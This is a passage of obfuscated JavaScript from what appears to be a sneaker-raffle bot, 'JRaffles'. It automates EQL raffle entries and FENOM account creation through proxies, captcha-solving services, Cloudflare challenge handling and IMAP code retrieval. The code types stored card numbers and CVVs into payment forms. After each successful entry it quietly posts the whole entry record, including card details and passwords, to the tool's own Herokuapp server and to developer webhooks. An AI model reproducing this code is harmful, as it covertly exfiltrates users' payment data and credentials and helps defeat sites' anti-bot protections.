                            _0x80328a && (await _0x253708['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x253708['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x253708['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x17175c(0x4b0), await _0x253708['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x17175c(0x1f4), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['CardNumber']), await _0x17175c(0x320), await _0x253708['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x253708['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['ExpiryDate']), await _0x17175c(0x4b0), await _0x253708['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x253708['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['CVV']), await _0x17175c(0x226), await _0x253708['type']('input[name=\x22postalCode\x22]', '' + _0xe521d9[_0x167716]['Zip']), await _0x17175c(0x226));
                            const _0x3b6530 = await _0x253708['$']('.__PrivateStripeElement');
                            _0x3b6530 && (await _0x17175c(0x1f4), await _0x253708['click']('.__PrivateStripeElement'), await _0x253708['click']('.__PrivateStripeElement'), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['CardNumber']), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['ExpiryDate']), await _0x253708['keyboard']['type']('' + _0xe521d9[_0x167716]['CVV']));
                            await _0x17175c(0x226), await _0x253708['click']('#paymentConsent'), await _0x17175c(0x226), await _0x253708['click']('#termsConsent'), await _0x17175c(0x2bc), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x253708['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x17175c(0x2710);
                            try {
                                await _0x253708['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x17175c(0xbb8), await _0x253708['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x215171 => _0x215171['click']()), await _0x253708['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x587a49 => _0x587a49['click']());
                            } catch {
                            }
                            try {
                                await _0x253708['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x6ff531 = await _0x253708['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x6ff531) {
                                    _0x2e1301['appendFileSync']('../accounts/eql.csv', '\x0a' + _0xe521d9[_0x167716]['Email'] + ',' + _0xe521d9[_0x167716]['Password'] + ',' + _0xe521d9[_0x167716]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x4fe7f0() {
                                var _0x3faa8c, _0x471ea5 = ![];
                                for (var _0x50747c = 0x0; _0x50747c < 0x18; _0x50747c++) {
                                    async function _0x6ea914() {
                                        var _0x5357ee = new _0x550e5b({
                                            'user': _0x395552['masterMail'],
                                            'password': _0x395552['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5873fd(_0x4ac3d1) {
                                            _0x5357ee['openBox']('INBOX', ![], _0x4ac3d1);
                                        }
                                        _0x5357ee['once']('ready', function () {
                                            console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5873fd(function (_0x482f67, _0x9ca5eb) {
                                                console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x482f67)
                                                    throw _0x482f67;
                                                _0x5357ee['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x139801, _0x58a44a) {
                                                    if (!_0x58a44a || !_0x58a44a['length'])
                                                        console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5357ee['end']();
                                                    else {
                                                        var _0x45462e = _0x5357ee['seq']['fetch'](_0x58a44a, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x45462e['on']('message', function (_0x55c9b6, _0x2cf5db) {
                                                            var _0x2176fb = '(#' + _0x2cf5db + ')\x20';
                                                            _0x55c9b6['on']('body', function (_0x156ed7, _0xaaef4e) {
                                                                _0x169414(_0x156ed7, (_0x3d7faf, _0x105729) => {
                                                                    if (_0x105729['subject']['includes']('code')) {
                                                                        const _0x57e666 = _0x105729['text']['split']('\x0a\x0a')[0x3], _0x10022c = _0x57e666['split']('\x0a')[0x1];
                                                                        _0x3faa8c = _0x10022c;
                                                                    }
                                                                });
                                                            }), _0x55c9b6['once']('end', function () {
                                                            });
                                                        }), _0x45462e['once']('error', function (_0x473be2) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x45462e['once']('end', function () {
                                                            _0x5357ee['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5357ee['once']('error', function (_0x2fa01f) {
                                            console['log'](_0x1446ca['red'](_0x2fa01f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x471ea5 = !![];
                                        }), _0x5357ee['once']('end', async function () {
                                        }), _0x5357ee['connect']();
                                    }
                                    _0x6ea914(), await _0x17175c(0x1388);
                                    if (_0x3faa8c)
                                        return _0x3faa8c;
                                    if (_0x471ea5)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x50747c == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4fe7f0(), await _0x17175c(0x1f4), await _0x253708['type']('#code', '' + code), await _0x17175c(0x3e8), await _0x253708['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x5164df => _0x5164df['click']()), await _0x253708['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x253708['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0xe521d9[_0x167716]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x2e1301['appendFileSync']('../accounts/eql.csv', '\x0a' + _0xe521d9[_0x167716]['Email'] + ',' + _0xe521d9[_0x167716]['Password'] + ',' + _0xe521d9[_0x167716]['Phone']), _0x11ff30 = 'no', _0x12263c(_0xe521d9[_0x167716], _0x202a0c);
                            var _0x52e2c2 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', ![]), _0x4e66b9 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'pub', ![]);
                            let _0x4d81f9 = _0xe521d9[_0x167716];
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0x202a0c['name'],
                                    'entrydata': JSON['stringify'](_0x4d81f9),
                                    'proxy': '' + _0x197a24[_0x167716]
                                };
                                var _0x553c60 = JSON['stringify'](prxdata);
                                let _0x5d1b46 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x553c60, _0x5d1b46);
                            } catch (_0x308c2e) {
                            }
                            const _0x58dd3f = {
                                'succesDEVMSG': { 'embeds': [_0x52e2c2] },
                                'succesPUBMSG': { 'embeds': [_0x4e66b9] }
                            };
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x58dd3f['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x58dd3f['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x58dd3f['succesPUBMSG']);
                            } catch (_0x323104) {
                                console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x323104));
                            }
                        } catch (_0x5147c7) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20' + _0x5147c7)), _0x27a68f = '' + _0x5147c7;
                            var _0x57edce = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', !![], _0x27a68f), _0x52e2c2 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', ![]), _0x4e66b9 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'pub', ![]);
                            const _0xd8149b = {
                                'succesDEVMSG': { 'embeds': [_0x52e2c2] },
                                'succesPUBMSG': { 'embeds': [_0x4e66b9] }
                            };
                            _0xd8149b['errorDEV'] = { 'embeds': [_0x57edce] };
                            _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0xd8149b['errorDEV']);
                            await _0x17b782(_0x40c5c7, _0xd8149b['errorDEV']);
                            if (!_0x11ff30 == 'no')
                                _0x11ff30 = 'yes';
                        } finally {
                            _0x707888 && _0x707888['close']();
                            if (_0x11ff30 == 'yes' && _0x1267a1 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1267a1 + '\x20/\x205)')), _0x167716 = _0x167716 - 0x1, _0x1267a1 = _0x1267a1 + 0x1;
                                continue;
                            }
                            _0x11ff30 == 'yes' && _0x1267a1 >= 0x5 && (_0x2848bf(_0xe521d9[_0x167716], _0x202a0c), _0x11ff30 = 'no', _0x1267a1 = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    } else {
                        const _0x393bb5 = '' + _0xe521d9[_0x167716]['Url'];
                        if (_0x11ff30 != 'yes')
                            var _0x11ff30 = '', _0x1267a1 = 0x0;
                        if (_0xe521d9[_0x167716]['Email'] == '' || _0xe521d9[_0x167716]['FirstName'] == '' || _0xe521d9[_0x167716]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xe521d9[_0x167716]['Password'] == '' && (_0xe521d9[_0x167716]['Password'] = 'JRaffles23!');
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x383c65 = _0x197a24[_0x167716]['split'](':');
                        else
                            var _0x448b89 = Math['round'](Math['random']() * (_0x197a24['length'] - 0x1)), _0x383c65 = _0x197a24[_0x448b89]['split'](':');
                        var _0x707888;
                        try {
                            _0x707888 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x383c65[0x0] + ':' + _0x383c65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x707888 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x383c65[0x0] + ':' + _0x383c65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3d5cc5 = await _0x707888['newPage']();
                            await _0x3d5cc5['authenticate']({
                                'username': '' + _0x383c65[0x2],
                                'password': '' + _0x383c65[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d5cc5['setRequestInterception'](!![]), _0x3d5cc5['on']('request', _0x2afe85 => {
                                _0x2afe85['resourceType']() === 'image' || _0x2afe85['resourceType']() === 'font' || _0x2afe85['resourceType']() === 'media' ? _0x2afe85['abort']() : _0x2afe85['continue']();
                            }), await _0x3d5cc5['goto'](_0x393bb5), await _0x3d5cc5['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x3d5cc5['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x17175c(0x7d0), await _0x3d5cc5['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x3d5cc5['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x17175c(0x3e8), await _0x3d5cc5['waitForSelector']('#email'), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x3d5cc5['type']('#email', '' + _0xe521d9[_0x167716]['Email']), await _0x17175c(0x352), await _0x3d5cc5['waitForSelector']('#password'), await _0x3d5cc5['type']('#password', '' + _0xe521d9[_0x167716]['Password']), await _0x17175c(0x352), await _0x3d5cc5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x17175c(0x1388);
                            if (!_0xe521d9[_0x167716]['Url']['includes']('footlocker'))
                                await _0x3d5cc5['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x3d5cc5['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x12263c(_0xe521d9[_0x167716], _0x202a0c), _0x11ff30 = 'no';
                                continue;
                            }
                            await _0x3d5cc5['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x17175c(0x3e8), await _0x3d5cc5['click']('li[data-value=\x22EU\x20' + _0xe521d9[_0x167716]['Size'] + '\x22]'), await _0x17175c(0x1f4);
                            const _0x12b59e = await _0x3d5cc5['$']('#title\x20>\x20label');
                            await _0x17175c(0x12c);
                            _0x12b59e && await _0x12b59e['click']();
                            await _0x3d5cc5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x3d5cc5['focus']('#postcode'), await _0x3d5cc5['keyboard']['down']('Control'), await _0x3d5cc5['keyboard']['press']('A'), await _0x3d5cc5['keyboard']['up']('Control'), await _0x3d5cc5['keyboard']['press']('Backspace'), await _0x3d5cc5['keyboard']['type'](_0xe521d9[_0x167716]['Zip']), await _0x17175c(0x60e), await _0x3d5cc5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x17175c(0x3e8), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x17175c(0x1f4);
                            const _0x1fa787 = await _0x3d5cc5['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x1fa787 && (await _0x3d5cc5['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3d5cc5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3d5cc5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x17175c(0x4b0), await _0x3d5cc5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x17175c(0x1f4), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['CardNumber']), await _0x17175c(0x320), await _0x3d5cc5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['ExpiryDate']), await _0x17175c(0x4b0), await _0x3d5cc5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['CVV']), await _0x17175c(0x226), await _0x3d5cc5['type']('input[name=\x22postalCode\x22]', '' + _0xe521d9[_0x167716]['Zip']), await _0x17175c(0x226));
                            const _0xac32b = await _0x3d5cc5['$']('.__PrivateStripeElement');
                            _0xac32b && (await _0x3d5cc5['click']('#billingName'), await _0x3d5cc5['click']('#billingName'), await _0x3d5cc5['type']('#billingName', '' + _0xe521d9[_0x167716]['NameOnCard']), await _0x17175c(0x1f4), await _0x3d5cc5['click']('.__PrivateStripeElement'), await _0x3d5cc5['click']('.__PrivateStripeElement'), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['CardNumber']), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['ExpiryDate']), await _0x3d5cc5['keyboard']['type']('' + _0xe521d9[_0x167716]['CVV']));
                            await _0x17175c(0x226), await _0x3d5cc5['click']('#paymentConsent'), await _0x17175c(0x226), await _0x3d5cc5['click']('#termsConsent'), await _0x17175c(0x2bc), console['log'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3d5cc5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x17175c(0x2710);
                            try {
                                await _0x3d5cc5['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x17175c(0xbb8), await _0x3d5cc5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xd7d3d2 => _0xd7d3d2['click']()), await _0x3d5cc5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x325d80 => _0x325d80['click']());
                            } catch {
                            }
                            try {
                                await _0x3d5cc5['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x12263c(_0xe521d9[_0x167716], _0x202a0c);
                            var _0x52e2c2 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', ![]), _0x4e66b9 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'pub', ![]);
                            let _0x3f21e8 = _0xe521d9[_0x167716];
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0x202a0c['name'],
                                    'entrydata': JSON['stringify'](_0x3f21e8),
                                    'proxy': '' + _0x197a24[_0x167716]
                                };
                                var _0x553c60 = JSON['stringify'](prxdata);
                                let _0x50c4d8 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x553c60, _0x50c4d8);
                            } catch (_0x159af7) {
                            }
                            const _0x28b451 = {
                                'succesDEVMSG': { 'embeds': [_0x52e2c2] },
                                'succesPUBMSG': { 'embeds': [_0x4e66b9] }
                            };
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x28b451['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x28b451['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x28b451['succesPUBMSG']);
                            } catch (_0x10901f) {
                                console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x10901f));
                            }
                            _0x11ff30 = 'no';
                        } catch (_0x238110) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20' + _0x238110)), _0x27a68f = '' + _0x238110;
                            var _0x57edce = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', !![], _0x27a68f), _0x52e2c2 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'dev', ![]), _0x4e66b9 = await _0x262703(_0xe521d9[_0x167716], _0x202a0c, 'pub', ![]);
                            const _0x153cc8 = {
                                'succesDEVMSG': { 'embeds': [_0x52e2c2] },
                                'succesPUBMSG': { 'embeds': [_0x4e66b9] }
                            };
                            _0x153cc8['errorDEV'] = { 'embeds': [_0x57edce] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x153cc8['errorDEV']), await _0x17b782(_0x40c5c7, _0x153cc8['errorDEV']), _0x11ff30 = 'yes';
                        } finally {
                            _0x707888 && _0x707888['close']();
                            if (_0x11ff30 == 'yes' && _0x1267a1 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x202a0c['name'] + ']\x20Task\x20' + (_0x167716 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1267a1 + '\x20/\x205)')), _0x167716 = _0x167716 - 0x1, _0x1267a1 = _0x1267a1 + 0x1;
                                continue;
                            }
                            _0x11ff30 == 'yes' && _0x1267a1 >= 0x5 && (_0x2848bf(_0xe521d9[_0x167716], _0x202a0c), _0x11ff30 = 'no', _0x1267a1 = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x200c05, _0x1fbcde, _0x1298da) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1ca439 = 0x0; _0x1ca439 < _0x1fbcde['length']; _0x1ca439++) {
                        if (_0x456243 != 'yes')
                            var _0x456243 = '', _0x56ead9 = 0x0;
                        var _0x2652d6;
                        try {
                            await _0x195de7(_0x1fbcde, _0x1ca439);
                        } catch {
                            _0x456243 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xe0def5(_0x200c05['name'] + '\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20/\x20' + _0x1fbcde['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0xc7e142 = await _0x262703(_0x1fbcde[_0x1ca439], _0x200c05, 'acc', ![]);
                        const _0x4748bd = { 'succesDEVMSG': { 'embeds': [_0xc7e142] } }, _0x47834d = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1c67d1 = Math['round'](Math['random']() * (_0x1298da['length'] - 0x1)), _0x137c9c = _0x1298da[_0x1c67d1]['split'](':'), _0x4a7f69;
                        try {
                            _0x4a7f69 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x137c9c[0x0] + ':' + _0x137c9c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4a7f69 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x137c9c[0x0] + ':' + _0x137c9c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xbfbbf0 = await _0x4a7f69['newPage']();
                            await _0xbfbbf0['setViewport']({
                                'width': 0x500 + _0x224b07(0x1, 0x32),
                                'height': 0x2d9 + _0x224b07(0x1, 0x32)
                            });
                            const _0x238706 = await _0xbfbbf0['target']()['createCDPSession'](), { windowId: _0x1f1e57 } = await _0x238706['send']('Browser.getWindowForTarget');
                            await _0xbfbbf0['authenticate']({
                                'username': '' + _0x137c9c[0x2],
                                'password': '' + _0x137c9c[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbfbbf0['goto']('' + _0x47834d, { 'waitUntil': 'networkidle2' }), console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x17175c(0x1388);
                            var _0xf8115f = await _0xbfbbf0['$']('.hcaptcha-box');
                            if (_0xf8115f) {
                                console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x17175c(0x2710);
                                const _0x1bd657 = await _0xbfbbf0['$']('.hcaptcha-box');
                                if (_0x1bd657)
                                    try {
                                        await _0x1bd657['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0xbfbbf0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x167ab6 = await _0xbfbbf0['$']('.hcaptcha-box');
                                    if (_0x167ab6)
                                        try {
                                            await _0x167ab6['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0xbfbbf0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x238706['send']('Browser.setWindowBounds', {
                                    'windowId': _0x1f1e57,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x17175c(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xbfbbf0['type']('input[name=\x22firstname\x22]', '' + _0x1fbcde[_0x1ca439]['FirstName']), await _0x17175c(0x1f4), await _0xbfbbf0['type']('input[name=\x22lastname\x22]', '' + _0x1fbcde[_0x1ca439]['LastName']), await _0x17175c(0x1f4), await _0xbfbbf0['type']('input[name=\x22email\x22]', '' + _0x1fbcde[_0x1ca439]['Email']), await _0x17175c(0x1f4), await _0xbfbbf0['type']('input[name=\x22password\x22]', '' + _0x1fbcde[_0x1ca439]['Password']), await _0x17175c(0x258), await _0xbfbbf0['$eval']('input[name=\x22psgdpr\x22]', _0x185755 => _0x185755['click']()), await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x200c05['name'] + ']\x20Task\x20' + (_0x1ca439 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xbfbbf0['$eval']('#customer-form', _0x4e5a26 => _0x4e5a26['submit']());
                            try {
                                try {
